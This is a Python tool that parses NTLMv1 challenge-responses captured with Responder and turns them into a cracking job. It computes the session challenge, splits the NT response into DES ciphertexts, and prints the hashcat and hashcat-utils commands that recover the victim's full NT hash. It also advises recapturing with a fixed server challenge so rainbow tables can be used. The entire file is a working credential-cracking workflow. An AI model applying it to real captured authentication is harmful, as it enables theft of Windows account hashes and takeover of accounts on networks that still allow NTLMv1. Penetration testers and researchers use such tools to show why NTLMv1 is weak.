##
# Ref: NTLM protocol specification https://winprotocoldoc.z19.web.core.windows.net/MS-NLMP/%5bMS-NLMP%5d.pdf
#   See pages 57/58 for NTLMv1 auth pseudocode and page 84 for definition of the DESL / DES functions seen in the pseudocode
##
import hashlib
import argparse

class ChallengeResponse:
    def __init__(self, response):
        segments = response.split(':')
        if len(segments) != 6:
            print('Unexpected format: Input response string should be in form DC02$::corp:B32BDFA30A59A78100000000000000000000000000000000:77E69027CB4083C3823D4E3C0856589BA7720D304B324906:1122334455667788')
            return
        if len(segments[4]) != 48:
            print('Unexpected format: Input response string is longer than expected, are you sure it is NTLMv1?')
            return
        self.username = segments[0]
        self.domain = segments[2]
        self.lm_challenge_response = segments[3]
        self.nt_challenge_response = segments[4]
        self.server_challenge = segments[5]
        self.full_challenge = self._calculate_ess_challenge() if self.lm_challenge_response[-28:] == "0000000000000000000000000000" else self.server_challenge

    def _calculate_ess_challenge(self):
        print('[!] Extended session security (ESS) was negotiated during NTLMv1 authentication. If using rainbow tables to crack, recapture using --disable-ess and a server challenge of 1122334455667788.')
        client_challenge = self.lm_challenge_response[:16]
        combined_challenge = self.server_challenge + client_challenge
        challenge_md5_hash = hashlib.md5(bytes.fromhex(combined_challenge)).hexdigest()
        return challenge_md5_hash[:16] # first 8 bytes of hash based on pseudocode from linked specification

def print_output(data):
    print(f'Cipher Text 1: {data.nt_challenge_response[:16]}')
    print(f'Cipher Text 2: {data.nt_challenge_response[16:32]}')
    print(f'Cipher Text 3: {data.nt_challenge_response[32:48]}')

    print(f'\n1. Save the following lines in a file:')
    print(f'{data.nt_challenge_response[:16]}:{data.full_challenge}')
    print(f'{data.nt_challenge_response[16:32]}:{data.full_challenge}')
    
    print(f'\n2. Recover the DES keys using hashcat:')
    print('./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashfile.txt ?1?1?1?1?1?1?1?1')

    print(f'\n3. Use the recovered DES keys to calculate the original NT hash segments using the hashcat utils tool:')
    print('./deskey_to_ntlm.pl <des_key_1>')
    print('./deskey_to_ntlm.pl <des_key_2>')

    print(f'\n4. Recover the final four characters of the NT hash using hashcat utils tool:')
    print(f'./ct3_to_ntlm.bin {data.nt_challenge_response[32:48]} {data.full_challenge}')

    print('\n5. Concatenate the three parts of the NT hash together.')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ntlmv1', help='NTLMv1 Hash in responder format', required=True)
    args = parser.parse_args()

    data = ChallengeResponse(args.ntlmv1)
    print_output(data)

if __name__ == '__main__':
    main()